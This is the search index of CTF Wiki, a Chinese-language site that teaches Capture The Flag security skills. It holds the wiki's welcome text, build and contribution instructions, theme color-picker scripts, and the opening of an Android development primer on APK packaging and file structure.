{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"CTF Wiki \u00b6 \u6b22\u8fce\u6765\u5230 CTF Wiki \u3002 CTF \uff08Capture The Flag\uff0c\u593a\u65d7\u8d5b\uff09\u8d77\u6e90\u4e8e 1996 \u5e74 DEFCON \u5168\u7403\u9ed1\u5ba2\u5927\u4f1a\uff0c\u662f\u7f51\u7edc\u5b89\u5168\u7231\u597d\u8005\u4e4b\u95f4\u7684\u7ade\u6280\u6e38\u620f\u3002 CTF \u7ade\u8d5b\u6d89\u53ca\u4f17\u591a\u9886\u57df\uff0c\u5185\u5bb9\u7e41\u6742\u3002\u76ee\u524d\uff0c\u5b89\u5168\u6280\u672f\u53d1\u5c55\u5730\u8d8a\u6765\u8d8a\u5feb\uff0c CTF \u9898\u76ee\u7684\u96be\u5ea6\u8d8a\u6765\u8d8a\u9ad8\uff0c\u521d\u5b66\u8005\u9700\u8981\u9762\u5bf9\u7684\u95e8\u69db\u56e0\u6b64\u4e5f\u8d8a\u6765\u8d8a\u9ad8\u3002\u800c\u7f51\u4e0a\u8d44\u6599\u5927\u90fd\u96f6\u6563\u7410\u788e\uff0c\u521d\u5b66\u8005\u5f80\u5f80\u5e76\u4e0d\u77e5\u9053\u8be5\u5982\u4f55\u7cfb\u7edf\u6027\u5730\u5b66\u4e60 CTF \u76f8\u5173\u9886\u57df\u77e5\u8bc6\uff0c\u5e38\u9700\u8981\u82b1\u8d39\u5927\u91cf\u65f6\u95f4\uff0c\u82e6\u4e0d\u582a\u8a00\u3002 \u4e3a\u4e86\u4f7f\u5f97\u70ed\u7231 CTF \u7684\u5c0f\u4f19\u4f34\u4eec\u66f4\u597d\u5730\u5165\u95e8 CTF \uff0c2016 \u5e74 10 \u6708\u4efd\uff0c CTF Wiki \u5728 Github \u6709\u4e86\u7b2c\u4e00\u6b21 commit\u3002\u968f\u7740\u5185\u5bb9\u4e0d\u65ad\u5b8c\u5584\uff0c CTF Wiki \u53d7\u5230\u4e86\u8d8a\u6765\u8d8a\u591a\u5b89\u5168\u7231\u597d\u8005\u7684\u559c\u7231\uff0c\u4e5f\u6e10\u6e10\u6709\u7d20\u672a\u8c0b\u9762\u7684\u5c0f\u4f19\u4f34\u4eec\u53c2\u4e0e\u5176\u4e2d\u3002 \u56f4\u7ed5 CTF \u8fd1\u51e0\u5e74\u8d5b\u9898\uff0c\u4f5c\u4e3a\u4e00\u4e2a\u81ea\u7531\u7684\u7ad9\u70b9\uff0c CTF Wiki \u5bf9 CTF \u4e2d\u7684\u5404\u4e2a\u65b9\u5411\u77e5\u8bc6\u548c\u6280\u672f\u8fdb\u884c\u4ecb\u7ecd\uff0c\u4ee5\u4fbf\u4e8e\u521d\u5b66\u8005\u66f4\u597d\u5730\u5b66\u4e60 CTF \u76f8\u5173\u7684\u77e5\u8bc6\u3002 \u76ee\u524d\uff0c CTF Wiki \u4e3b\u8981\u5305\u542b CTF \u5404\u5927\u65b9\u5411\u7684\u57fa\u7840\u77e5\u8bc6\u3002 \u5f53\u7136\uff0c CTF Wiki \u57fa\u4e8e CTF \uff0c\u5374\u4e0d\u4f1a\u5c40\u9650\u4e8e CTF \uff0c\u5728\u672a\u6765\uff0c CTF Wiki \u4f1a\u66f4\u4e13\u6ce8\u4e8e\u5b8c\u5584\u4e8e\u4ee5\u4e0b\u5185\u5bb9\uff1a CTF \u7ade\u8d5b\u4e2d\u7684\u8fdb\u9636\u77e5\u8bc6 CTF \u7ade\u8d5b\u4e2d\u7684\u4f18\u8d28\u9898\u76ee \u5b89\u5168\u7814\u7a76\u4e2d\u7684\u5de5\u5177\u4ecb\u7ecd \u66f4\u591a\u5730\u4e0e\u5b89\u5168\u5b9e\u6218\u7ed3\u5408 \u5173\u4e8e\u4e0a\u8ff0\u90e8\u5206\u5f85\u5b8c\u5584\u5185\u5bb9\uff0c\u8bf7\u53c2\u89c1 CTF Wiki \u4e2d\u7684 Projects \u3002 \u4e0e\u6b64\u540c\u65f6\uff0cCTF Wiki \u6e90\u4e8e\u793e\u533a\uff0c\u63d0\u5021\u77e5\u8bc6\u81ea\u7531\uff0c\u5728\u672a\u6765\u4e5f\u7edd\u4e0d\u4f1a\u5546\u4e1a\u5316\uff0c\u5c06\u59cb\u7ec8\u4fdd\u6301\u72ec\u7acb\u81ea\u7531\u7684\u6027\u8d28\u3002 How to build\uff1f \u00b6 \u672c\u6587\u6863\u76ee\u524d\u91c7\u7528 mkdocs \u90e8\u7f72\u5728 https://ctf-wiki.github.io/ctf-wiki/ \u3002\u5f53\u7136\u4e5f\u53ef\u4ee5\u90e8\u7f72\u5728\u672c\u5730\uff0c\u5177\u4f53\u65b9\u5f0f\u5982\u4e0b\uff1a # 1. clone git clone git@github.com:ctf-wiki/ctf-wiki.git # 2. requirements pip install -r requirements.txt # generate static file in site/ mkdocs build # deploy at http://127.0.0.1:8000 mkdocs serve mkdocs \u672c\u5730\u90e8\u7f72\u7684\u7f51\u7ad9\u662f\u52a8\u6001\u66f4\u65b0\u7684\uff0c\u5373\u5f53\u4f60\u4fee\u6539\u5e76\u4fdd\u5b58 md \u6587\u4ef6\u540e\uff0c\u5237\u65b0\u9875\u9762\u5c31\u80fd\u968f\u4e4b\u52a8\u6001\u66f4\u65b0\u3002 How to practice\uff1f \u00b6 Wiki \u4e2d\u7684\u6240\u6709\u9898\u76ee\u5728 ctf-challenges \u4ed3\u5e93\u4e2d\uff0c\u8bf7\u6839\u636e\u5bf9\u5e94\u7684\u5206\u7c7b\u81ea\u884c\u5bfb\u627e\u3002 \u6ce8\uff1a\u76ee\u524d\u4ecd\u6709\u90e8\u5206\u9898\u76ee\u5728\u8be5\u4ed3\u5e93\u4e0b\uff0c\u6b63\u5728\u8fc1\u79fb\u4e2d\u3002\u3002\u3002\uff08misc\uff0cweb\uff09 How to make CTF Wiki Better\uff1f \u00b6 \u6211\u4eec\u975e\u5e38\u6b22\u8fce\u4f60\u4e3a Wiki \u7f16\u5199\u5185\u5bb9\uff0c\u5c06\u81ea\u5df1\u7684\u6240\u5b66\u6240\u5f97\u4e0e\u5927\u5bb6\u5206\u4eab\uff0c\u5177\u4f53\u7684\u8d21\u732e\u65b9\u5f0f\u8bf7\u53c2\u89c1 CONTRIBUTING \u3002 \u5728\u4f60\u51b3\u5b9a\u8981\u8d21\u732e\u5185\u5bb9\u4e4b\u524d\uff0c\u8bf7\u4f60\u52a1\u5fc5\u770b\u5b8c\u8fd9\u4e9b\u5185\u5bb9 \u3002\u6211\u4eec\u671f\u5f85\u7740\u4f60\u7684\u52a0\u5165\u3002 \u975e\u5e38\u611f\u8c22\u4e00\u8d77\u5b8c\u5584 CTF Wiki \u7684\u5c0f\u4f19\u4f34\u4eec How can you get? \u00b6 \u4e00\u4e2a\u4e0d\u4e00\u6837\u7684\u601d\u8003\u65b9\u5f0f\u4ee5\u53ca\u4e00\u9897\u4e50\u4e8e\u89e3\u51b3\u95ee\u9898\u7684\u5fc3 \u953b\u70bc\u4f60\u7684\u5feb\u901f\u5b66\u4e60\u80fd\u529b\uff0c\u4e0d\u65ad\u5b66\u4e60\u65b0\u4e8b\u7269 \u4e00\u4e9b\u6709\u8da3\u7684\u5b89\u5168\u6280\u672f\u4e0e\u76f8\u5e94\u7684\u6311\u6218 \u4e00\u6bb5\u5145\u5b9e\u594b\u6597\u7684\u65f6\u5149 \u5728\u9605\u8bfb Wiki \u4e4b\u524d\uff0c\u6211\u4eec\u5e0c\u671b\u80fd\u7ed9\u4e88\u4f60\u51e0\u70b9\u5efa\u8bae\uff1a \u81f3\u5c11\u638c\u63e1\u4e00\u95e8\u7f16\u7a0b\u8bed\u8a00\uff0c\u6bd4\u5982 Python \u9605\u8bfb\u77ed\u6587 \u63d0\u95ee\u7684\u667a\u6167 \u5584\u7528 Google \u641c\u7d22\u80fd\u5e2e\u52a9\u4f60\u66f4\u597d\u5730\u63d0\u5347\u81ea\u5df1 \u52a8\u624b\u5b9e\u8df5\u6bd4\u4ec0\u4e48\u90fd\u8981\u7ba1\u7528 \u4fdd\u6301\u5bf9\u6280\u672f\u7684\u597d\u5947\u4e0e\u6e34\u671b\u5e76\u575a\u6301\u4e0b\u53bb \u4e16\u754c\u5f88\u5927\uff0c\u4e92\u8054\u7f51\u8ba9\u4e16\u754c\u53d8\u5c0f\uff0c\u771f\u7684\u9ed1\u5ba2\u4eec\u5e94\u8be5\u53bb\u601d\u8003\u5e76\u521b\u9020\uff0c\u65e0\u8bba\u5f53\u4e0b\u662f\u5728\u7834\u574f\u8fd8\u662f\u5728\u521b\u9020\uff0c\u8bb0\u4f4f\uff0c\u672a\u6765\uff0c\u90a3\u6761\u4e3b\u7ebf\u662f\u521b\u9020\u7684\u5c31\u5bf9\u4e86\u3002 \u2014\u2014by \u4f59\u5f26 \u5b89\u5168\u5708\u5f88\u5c0f\uff0c\u5b89\u5168\u7684\u6d77\u6d0b\u5f88\u6df1\u3002\u5b89\u5168\u4e4b\u8def\u7684\u63a2\u9669\uff0c\u4e0d\u5982\u5c31\u4ece CTF Wiki \u5f00\u59cb\uff01 Material color palette \u989c\u8272\u4e3b\u9898 \u00b6 Primary colors \u4e3b\u8272 \u00b6 \u9ed8\u8ba4 white \u70b9\u51fb\u8272\u5757\u53ef\u66f4\u6362\u4e3b\u9898\u7684\u4e3b\u8272 Red Pink Purple Deep Purple Indigo Blue Light Blue Cyan Teal Green Light Green Lime Yellow Amber Orange Deep Orange Brown Grey Blue Grey White var buttons = document.querySelectorAll(\"button[data-md-color-primary]\"); Array.prototype.forEach.call(buttons, function(button) { button.addEventListener(\"click\", function() { document.body.dataset.mdColorPrimary = this.dataset.mdColorPrimary; localStorage.setItem(\"data-md-color-primary\",this.dataset.mdColorPrimary); }) }) Accent colors \u8f85\u52a9\u8272 \u00b6 \u9ed8\u8ba4 red \u70b9\u51fb\u8272\u5757\u66f4\u6362\u4e3b\u9898\u7684\u8f85\u52a9\u8272 Red Pink Purple Deep Purple Indigo Blue Light Blue Cyan Teal Green Light Green Lime Yellow Amber Orange Deep Orange var buttons = document.querySelectorAll(\"button[data-md-color-accent]\"); Array.prototype.forEach.call(buttons, function(button) { button.addEventListener(\"click\", function() { document.body.dataset.mdColorAccent = this.dataset.mdColorAccent; localStorage.setItem(\"data-md-color-accent\",this.dataset.mdColorAccent); }) })","title":"Getting Started"},{"location":"#ctf-wiki","text":"\u6b22\u8fce\u6765\u5230 CTF Wiki \u3002 CTF \uff08Capture The Flag\uff0c\u593a\u65d7\u8d5b\uff09\u8d77\u6e90\u4e8e 1996 \u5e74 DEFCON \u5168\u7403\u9ed1\u5ba2\u5927\u4f1a\uff0c\u662f\u7f51\u7edc\u5b89\u5168\u7231\u597d\u8005\u4e4b\u95f4\u7684\u7ade\u6280\u6e38\u620f\u3002 CTF \u7ade\u8d5b\u6d89\u53ca\u4f17\u591a\u9886\u57df\uff0c\u5185\u5bb9\u7e41\u6742\u3002\u76ee\u524d\uff0c\u5b89\u5168\u6280\u672f\u53d1\u5c55\u5730\u8d8a\u6765\u8d8a\u5feb\uff0c CTF \u9898\u76ee\u7684\u96be\u5ea6\u8d8a\u6765\u8d8a\u9ad8\uff0c\u521d\u5b66\u8005\u9700\u8981\u9762\u5bf9\u7684\u95e8\u69db\u56e0\u6b64\u4e5f\u8d8a\u6765\u8d8a\u9ad8\u3002\u800c\u7f51\u4e0a\u8d44\u6599\u5927\u90fd\u96f6\u6563\u7410\u788e\uff0c\u521d\u5b66\u8005\u5f80\u5f80\u5e76\u4e0d\u77e5\u9053\u8be5\u5982\u4f55\u7cfb\u7edf\u6027\u5730\u5b66\u4e60 CTF \u76f8\u5173\u9886\u57df\u77e5\u8bc6\uff0c\u5e38\u9700\u8981\u82b1\u8d39\u5927\u91cf\u65f6\u95f4\uff0c\u82e6\u4e0d\u582a\u8a00\u3002 \u4e3a\u4e86\u4f7f\u5f97\u70ed\u7231 CTF \u7684\u5c0f\u4f19\u4f34\u4eec\u66f4\u597d\u5730\u5165\u95e8 CTF \uff0c2016 \u5e74 10 \u6708\u4efd\uff0c CTF Wiki \u5728 Github \u6709\u4e86\u7b2c\u4e00\u6b21 commit\u3002\u968f\u7740\u5185\u5bb9\u4e0d\u65ad\u5b8c\u5584\uff0c CTF Wiki \u53d7\u5230\u4e86\u8d8a\u6765\u8d8a\u591a\u5b89\u5168\u7231\u597d\u8005\u7684\u559c\u7231\uff0c\u4e5f\u6e10\u6e10\u6709\u7d20\u672a\u8c0b\u9762\u7684\u5c0f\u4f19\u4f34\u4eec\u53c2\u4e0e\u5176\u4e2d\u3002 \u56f4\u7ed5 CTF \u8fd1\u51e0\u5e74\u8d5b\u9898\uff0c\u4f5c\u4e3a\u4e00\u4e2a\u81ea\u7531\u7684\u7ad9\u70b9\uff0c CTF Wiki \u5bf9 CTF \u4e2d\u7684\u5404\u4e2a\u65b9\u5411\u77e5\u8bc6\u548c\u6280\u672f\u8fdb\u884c\u4ecb\u7ecd\uff0c\u4ee5\u4fbf\u4e8e\u521d\u5b66\u8005\u66f4\u597d\u5730\u5b66\u4e60 CTF \u76f8\u5173\u7684\u77e5\u8bc6\u3002 \u76ee\u524d\uff0c CTF Wiki \u4e3b\u8981\u5305\u542b CTF \u5404\u5927\u65b9\u5411\u7684\u57fa\u7840\u77e5\u8bc6\u3002 \u5f53\u7136\uff0c CTF Wiki \u57fa\u4e8e CTF \uff0c\u5374\u4e0d\u4f1a\u5c40\u9650\u4e8e CTF \uff0c\u5728\u672a\u6765\uff0c CTF Wiki \u4f1a\u66f4\u4e13\u6ce8\u4e8e\u5b8c\u5584\u4e8e\u4ee5\u4e0b\u5185\u5bb9\uff1a CTF \u7ade\u8d5b\u4e2d\u7684\u8fdb\u9636\u77e5\u8bc6 CTF \u7ade\u8d5b\u4e2d\u7684\u4f18\u8d28\u9898\u76ee \u5b89\u5168\u7814\u7a76\u4e2d\u7684\u5de5\u5177\u4ecb\u7ecd \u66f4\u591a\u5730\u4e0e\u5b89\u5168\u5b9e\u6218\u7ed3\u5408 \u5173\u4e8e\u4e0a\u8ff0\u90e8\u5206\u5f85\u5b8c\u5584\u5185\u5bb9\uff0c\u8bf7\u53c2\u89c1 CTF Wiki \u4e2d\u7684 Projects \u3002 \u4e0e\u6b64\u540c\u65f6\uff0cCTF Wiki \u6e90\u4e8e\u793e\u533a\uff0c\u63d0\u5021\u77e5\u8bc6\u81ea\u7531\uff0c\u5728\u672a\u6765\u4e5f\u7edd\u4e0d\u4f1a\u5546\u4e1a\u5316\uff0c\u5c06\u59cb\u7ec8\u4fdd\u6301\u72ec\u7acb\u81ea\u7531\u7684\u6027\u8d28\u3002","title":"CTF Wiki"},{"location":"#how-to-build","text":"\u672c\u6587\u6863\u76ee\u524d\u91c7\u7528 mkdocs \u90e8\u7f72\u5728 https://ctf-wiki.github.io/ctf-wiki/ \u3002\u5f53\u7136\u4e5f\u53ef\u4ee5\u90e8\u7f72\u5728\u672c\u5730\uff0c\u5177\u4f53\u65b9\u5f0f\u5982\u4e0b\uff1a # 1. clone git clone git@github.com:ctf-wiki/ctf-wiki.git # 2. requirements pip install -r requirements.txt # generate static file in site/ mkdocs build # deploy at http://127.0.0.1:8000 mkdocs serve mkdocs \u672c\u5730\u90e8\u7f72\u7684\u7f51\u7ad9\u662f\u52a8\u6001\u66f4\u65b0\u7684\uff0c\u5373\u5f53\u4f60\u4fee\u6539\u5e76\u4fdd\u5b58 md \u6587\u4ef6\u540e\uff0c\u5237\u65b0\u9875\u9762\u5c31\u80fd\u968f\u4e4b\u52a8\u6001\u66f4\u65b0\u3002","title":"How to build\uff1f"},{"location":"#how-to-practice","text":"Wiki \u4e2d\u7684\u6240\u6709\u9898\u76ee\u5728 ctf-challenges \u4ed3\u5e93\u4e2d\uff0c\u8bf7\u6839\u636e\u5bf9\u5e94\u7684\u5206\u7c7b\u81ea\u884c\u5bfb\u627e\u3002 \u6ce8\uff1a\u76ee\u524d\u4ecd\u6709\u90e8\u5206\u9898\u76ee\u5728\u8be5\u4ed3\u5e93\u4e0b\uff0c\u6b63\u5728\u8fc1\u79fb\u4e2d\u3002\u3002\u3002\uff08misc\uff0cweb\uff09","title":"How to practice\uff1f"},{"location":"#how-to-make-ctf-wiki-better","text":"\u6211\u4eec\u975e\u5e38\u6b22\u8fce\u4f60\u4e3a Wiki \u7f16\u5199\u5185\u5bb9\uff0c\u5c06\u81ea\u5df1\u7684\u6240\u5b66\u6240\u5f97\u4e0e\u5927\u5bb6\u5206\u4eab\uff0c\u5177\u4f53\u7684\u8d21\u732e\u65b9\u5f0f\u8bf7\u53c2\u89c1 CONTRIBUTING \u3002 \u5728\u4f60\u51b3\u5b9a\u8981\u8d21\u732e\u5185\u5bb9\u4e4b\u524d\uff0c\u8bf7\u4f60\u52a1\u5fc5\u770b\u5b8c\u8fd9\u4e9b\u5185\u5bb9 \u3002\u6211\u4eec\u671f\u5f85\u7740\u4f60\u7684\u52a0\u5165\u3002 \u975e\u5e38\u611f\u8c22\u4e00\u8d77\u5b8c\u5584 CTF Wiki \u7684\u5c0f\u4f19\u4f34\u4eec","title":"How to make CTF Wiki Better\uff1f"},{"location":"#how-can-you-get","text":"\u4e00\u4e2a\u4e0d\u4e00\u6837\u7684\u601d\u8003\u65b9\u5f0f\u4ee5\u53ca\u4e00\u9897\u4e50\u4e8e\u89e3\u51b3\u95ee\u9898\u7684\u5fc3 \u953b\u70bc\u4f60\u7684\u5feb\u901f\u5b66\u4e60\u80fd\u529b\uff0c\u4e0d\u65ad\u5b66\u4e60\u65b0\u4e8b\u7269 \u4e00\u4e9b\u6709\u8da3\u7684\u5b89\u5168\u6280\u672f\u4e0e\u76f8\u5e94\u7684\u6311\u6218 \u4e00\u6bb5\u5145\u5b9e\u594b\u6597\u7684\u65f6\u5149 \u5728\u9605\u8bfb Wiki \u4e4b\u524d\uff0c\u6211\u4eec\u5e0c\u671b\u80fd\u7ed9\u4e88\u4f60\u51e0\u70b9\u5efa\u8bae\uff1a \u81f3\u5c11\u638c\u63e1\u4e00\u95e8\u7f16\u7a0b\u8bed\u8a00\uff0c\u6bd4\u5982 Python \u9605\u8bfb\u77ed\u6587 \u63d0\u95ee\u7684\u667a\u6167 \u5584\u7528 Google \u641c\u7d22\u80fd\u5e2e\u52a9\u4f60\u66f4\u597d\u5730\u63d0\u5347\u81ea\u5df1 \u52a8\u624b\u5b9e\u8df5\u6bd4\u4ec0\u4e48\u90fd\u8981\u7ba1\u7528 \u4fdd\u6301\u5bf9\u6280\u672f\u7684\u597d\u5947\u4e0e\u6e34\u671b\u5e76\u575a\u6301\u4e0b\u53bb \u4e16\u754c\u5f88\u5927\uff0c\u4e92\u8054\u7f51\u8ba9\u4e16\u754c\u53d8\u5c0f\uff0c\u771f\u7684\u9ed1\u5ba2\u4eec\u5e94\u8be5\u53bb\u601d\u8003\u5e76\u521b\u9020\uff0c\u65e0\u8bba\u5f53\u4e0b\u662f\u5728\u7834\u574f\u8fd8\u662f\u5728\u521b\u9020\uff0c\u8bb0\u4f4f\uff0c\u672a\u6765\uff0c\u90a3\u6761\u4e3b\u7ebf\u662f\u521b\u9020\u7684\u5c31\u5bf9\u4e86\u3002 \u2014\u2014by \u4f59\u5f26 \u5b89\u5168\u5708\u5f88\u5c0f\uff0c\u5b89\u5168\u7684\u6d77\u6d0b\u5f88\u6df1\u3002\u5b89\u5168\u4e4b\u8def\u7684\u63a2\u9669\uff0c\u4e0d\u5982\u5c31\u4ece CTF Wiki \u5f00\u59cb\uff01","title":"How can you get?"},{"location":"#material-color-palette","text":"","title":"Material color palette \u989c\u8272\u4e3b\u9898"},{"location":"#primary-colors","text":"\u9ed8\u8ba4 white \u70b9\u51fb\u8272\u5757\u53ef\u66f4\u6362\u4e3b\u9898\u7684\u4e3b\u8272 Red Pink Purple Deep Purple Indigo Blue Light Blue Cyan Teal Green Light Green Lime Yellow Amber Orange Deep Orange Brown Grey Blue Grey White var buttons = document.querySelectorAll(\"button[data-md-color-primary]\"); Array.prototype.forEach.call(buttons, function(button) { button.addEventListener(\"click\", function() { document.body.dataset.mdColorPrimary = this.dataset.mdColorPrimary; localStorage.setItem(\"data-md-color-primary\",this.dataset.mdColorPrimary); }) })","title":"Primary colors \u4e3b\u8272"},{"location":"#accent-colors","text":"\u9ed8\u8ba4 red \u70b9\u51fb\u8272\u5757\u66f4\u6362\u4e3b\u9898\u7684\u8f85\u52a9\u8272 Red Pink Purple Deep Purple Indigo Blue Light Blue Cyan Teal Green Light Green Lime Yellow Amber Orange Deep Orange var buttons = document.querySelectorAll(\"button[data-md-color-accent]\"); Array.prototype.forEach.call(buttons, function(button) { button.addEventListener(\"click\", function() { document.body.dataset.mdColorAccent = this.dataset.mdColorAccent; localStorage.setItem(\"data-md-color-accent\",this.dataset.mdColorAccent); }) })","title":"Accent colors \u8f85\u52a9\u8272"},{"location":"android/readme/","text":"Android \u5b89\u5168 \u00b6","title":"Android \u5b89\u5168"},{"location":"android/readme/#android","text":"","title":"Android \u5b89\u5168"},{"location":"android/basic_develop/basic_develop/","text":"Android \u5f00\u53d1\u57fa\u7840 \u00b6 \u5728\u505a Android \u5b89\u5168\u4e4b\u524d\uff0c\u6211\u4eec\u5e94\u8be5\u5c3d\u53ef\u80fd\u5730\u4e86\u89e3 Android \u5f00\u53d1\u7684\u57fa\u672c\u6d41\u7a0b\u3002 \u57fa\u7840\u77e5\u8bc6 \u00b6 \u4f9d\u6b21\u9605\u8bfb\u4ee5\u4e0b\u4e66\u7c4d\uff0c\u7531\u6d45\u5165\u6df1\u5730\u4e86\u89e3 Android \u57fa\u672c\u5f00\u53d1\u77e5\u8bc6 \u7b2c\u4e00\u884c\u4ee3\u7801\uff0c\u9605\u8bfb\u5b8c\u524d\u4e03\u7ae0\u5373\u53ef JNI/NDK \u5f00\u53d1\uff0c\u76ee\u524d\u5c1a\u672a\u627e\u5230\u4e00\u672c\u76f8\u5173\u5408\u9002\u7684\u6307\u5357\u3002 Android \u7f16\u7a0b\u6743\u5a01\u6307\u5357\uff08\u53ef\u9009\uff09 Android \u9ad8\u7ea7\u8fdb\u9636\uff08\u53ef\u9009\uff09 \u5728\u5b66\u4e60\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e2a\u4eba\u89c9\u5f97\u9700\u8981\u7740\u91cd\u4e86\u89e3 Android \u5f00\u53d1\u4e2d\u5982\u4e0b\u77e5\u8bc6 Android \u7cfb\u7edf\u67b6\u6784 \u57fa\u672c\u6e90\u6587\u4ef6\u67b6\u6784 \u57fa\u672c\u5f00\u53d1\u65b9\u5f0f\u4e0e\u4ee3\u7801\u7f16\u5199\u60ef\u4f8b\uff0c\u4e86\u89e3\u5e38\u89c1\u4ee3\u7801\u7684\u610f\u601d\u3002 \u4e86\u89e3 xml \u7b49\u4e00\u4e9b\u914d\u7f6e\u8d44\u6e90\u7684\u6587\u4ef6\u683c\u5f0f\u3002 \u4e00\u5b9a\u8981\u642d\u597d\u57fa\u672c\u7684 Android \u5f00\u53d1\u73af\u5883\uff01\uff01\uff01\uff01\uff01 java ddms ndk sdk\uff0c\u591a\u5b89\u88c5\u51e0\u4e2a\u7248\u672c\u7684 sdk\uff0c5.0-8.0 Apk \u6253\u5305\u6d41\u7a0b \u00b6 \u5f53\u7f16\u5199\u5b8c App \u76f8\u5173\u7684\u4ee3\u7801\u540e\uff0c\u6211\u4eec\u7684\u6700\u540e\u4e00\u6b65\u5c31\u662f\u5c06 App \u4e2d\u6240\u6709\u4f7f\u7528\u5230\u7684\u8d44\u6e90\u6587\u4ef6\u8fdb\u884c\u6253\u5305\uff0c\u6253\u5305\u6d41\u7a0b\u5982\u4e0b\u56fe\uff08 http://androidsrc.net/android-app-build-overview/ \uff09\u6240\u793a\uff1a \u5177\u4f53\u7684\u64cd\u4f5c\u5982\u4e0b \u4f7f\u7528 aapt( The Android Asset Packing Tool ) \u5bf9\u8d44\u6e90\u6587\u4ef6\u8fdb\u884c\u6253\u5305\uff0c\u751f\u6210 R.java \u6587\u4ef6\u3002 \u5982\u679c\u9879\u76ee\u4e2d\u4f7f\u7528\u5230\u4e86 AIDL\uff08Android Interface Definition Language\uff09\u63d0\u4f9b\u7684\u670d\u52a1\uff0c\u5219\u9700\u8981\u4f7f\u7528 AIDL \u5de5\u5177\u89e3\u6790 AIDL \u63a5\u53e3\u6587\u4ef6\u751f\u6210\u76f8\u5e94\u7684 Java \u4ee3\u7801\u3002 \u4f7f\u7528 javac \u5c06 R.java \u548c AIDL \u6587\u4ef6\u7f16\u8bd1\u4e3a .class \u6587\u4ef6\u3002 \u4f7f\u7528 dx \u5de5\u5177\u5c06 class \u548c\u7b2c\u4e09\u65b9\u7684 library \u8f6c\u6362\u4e3a dex \u6587\u4ef6\u3002 \u5229\u7528 apkbuilder \u5c06\u7b2c\u4e00\u6b65\u7f16\u8bd1\u540e\u7684\u8d44\u6e90\u3001\u7b2c\u56db\u6b65\u751f\u6210\u7684 .dex \u6587\u4ef6\uff0c\u4ee5\u53ca\u4e00\u4e9b\u5176\u5b83\u8d44\u6e90\u6253\u5305\u5230 APK \u6587\u4ef6\u4e2d\u3002 \u8fd9\u4e00\u90e8\u4e3b\u8981\u662f\u5bf9 APK \u8fdb\u884c\u7b7e\u540d\u3002\u53ef\u4ee5\u5206\u4e3a\u4e24\u79cd\u60c5\u51b5\uff0c\u5982\u679c\u6211\u4eec\u662f\u8981\u53d1\u5e03 App\uff0c\u90a3\u5c31\u91c7\u7528 RealeaseKeystore \u7b7e\u540d\uff1b\u53cd\u4e4b\uff0c\u6211\u4eec\u5982\u679c\u53ea\u662f\u60f3\u8981\u5bf9 App \u8fdb\u884c\u8c03\u8bd5\uff0c\u90a3\u5c31\u4f7f\u7528 debug.keystore \u7b7e\u540d\u3002 \u5728\u53d1\u5e03\u6b63\u5f0f\u7248\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u5c06 APK \u5305\u4e2d\u8d44\u6e90\u6587\u4ef6\u8ddd\u79bb\u6587\u4ef6\u7684\u8d77\u59cb\u504f\u79fb\u4fee\u6539\u4e3a 4 \u5b57\u8282\u7684\u6574\u6570\u500d\u6570\uff0c\u8fd9\u6837\uff0c\u5728\u4e4b\u540e\u8fd0\u884c App \u7684\u65f6\u5019\uff0c\u901f\u5ea6\u4f1a\u6bd4\u8f83\u5feb\u3002 Apk \u6587\u4ef6\u7ed3\u6784 \u00b6 APK \u6587\u4ef6\u4e5f\u662f\u4e00\u79cd ZIP \u6587\u4ef6\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u89e3\u538b zip \u7684\u5de5\u5177\u6765\u5bf9\u5176\u8fdb\u884c\u89e3\u538b\u3002\u4e00\u4e2a\u5178\u578b\u7684 APK \u6587\u4ef6\u7684\u7ed3\u6784\u5982\u4e0b\u56fe\u6240\u793a\u3002\u5176\u4e2d\uff0c\u5173\u4e8e\u6bcf\u4e00\u90e8\u5206\u7684\u4ecb\u7ecd\u5982\u4e0b AndroidManifest.xml \u8be5\u6587\u4ef6\u4e3b\u8981\u7528\u4e8e\u58f0\u660e\u5e94\u7528\u7a0b\u5e8f\u7684\u540d\u79f0\uff0c\u7ec4\u4ef6\uff0c\u6743\u9650\u7b49\u57fa\u672c\u4fe1\u606f\u3002 class.dex \u8be5\u6587\u4ef6\u662f dalvik \u865a\u62df\u673a\u5bf9\u5e94\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5305\u542b\u5e94\u7528\u7a0b\u5e8f\u7684\u53ef\u6267\u884c\u4ee3\u7801\u3002 resource.arsc \u8be5\u6587\u4ef6\u4e3b\u8981\u662f\u5e94\u7528\u7a0b\u5e8f\u7f16\u8bd1\u540e\u7684\u4e8c\u8fdb\u5236\u8d44\u6e90\u4ee5\u53ca\u8d44\u6e90\u4f4d\u7f6e\u4e0e\u8d44\u6e90 id \u4e4b\u95f4\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u5982\u5b57\u7b26\u4e32\u3002 assets \u8be5\u6587\u4ef6\u5939\u4e00\u822c\u7528\u4e8e\u5305\u542b\u5e94\u7528\u7a0b\u5e8f\u7684\u539f\u59cb\u8d44\u6e90\u6587\u4ef6\uff0c\u4f8b\u5982\u5b57\u4f53\u548c\u97f3\u4e50\u6587\u4ef6\u3002\u7a0b\u5e8f\u5728\u8fd0\u884c\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u901a\u8fc7API \u83b7\u53d6\u8fd9\u4e9b\u4fe1\u606f\u3002 lib/ lib\u76ee\u5f55\u4e0b\u4e3b\u8981\u7528\u4e8e\u5b58\u50a8\u901a\u8fc7 JNI\uff08Java Native Interface\uff09\u673a\u5236\u4f7f\u7528\u7684\u672c\u5730\u5e93\u6587\u4ef6\uff0c\u5e76\u4e14\u4f1a\u6309\u7167\u5176\u652f\u6301\u7684\u67b6\u6784\uff0c\u5206\u522b\u521b\u5efa\u5bf9\u5e94\u7684\u5b50\u76ee\u5f55\u3002 res/ \u8be5\u76ee\u5f55\u4e3b\u8981\u5305\u542b\u4e86 Android \u5e94\u7528\u5f15\u7528\u7684\u8d44\u6e90\uff0c\u5e76\u4e14\u4f1a\u6309\u7167\u8d44\u6e90\u7c7b\u578b\u8fdb\u884c\u5b58\u50a8\uff0c\u5982\u56fe\u7247\uff0c\u52a8\u753b\uff0c\u83dc\u5355\u7b49\u3002\u4e3b\u8981\u8fd8\u6709\u4e00\u4e2a value \u6587\u4ef6\u5939\uff0c\u5305\u542b\u4e86\u5404\u7c7b\u5c5e\u6027\u8d44\u6e90 colors.xml\u2192\u989c\u8272\u8d44\u6e90 dimens.xml--->\u5c3a\u5bf8\u8d44\u6e90 